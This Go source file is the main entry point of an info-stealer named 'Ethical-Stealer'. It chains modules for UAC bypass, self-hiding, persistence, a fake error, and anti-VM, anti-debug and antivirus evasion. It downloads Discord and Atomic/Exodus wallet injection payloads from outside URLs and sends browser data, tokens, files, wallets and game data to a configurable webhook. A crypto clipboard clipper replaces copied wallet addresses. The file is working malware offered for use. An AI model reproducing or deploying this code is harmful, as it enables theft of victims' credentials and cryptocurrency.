package main

import (
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/antidebug"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/antivm"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/antivirus"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/browsers"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/clipper"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/commonfiles"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/discodes"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/discordinjection"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/fakeerror"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/games"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/hideconsole"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/startup"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/system"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/tokens"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/uacbypass"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/wallets"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/walletsinjection"
    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "Change webhook",
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/opiumsoftware/wallets-injection/raw/main/atomic.asar",
		"https://github.com/opiumsoftware/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}



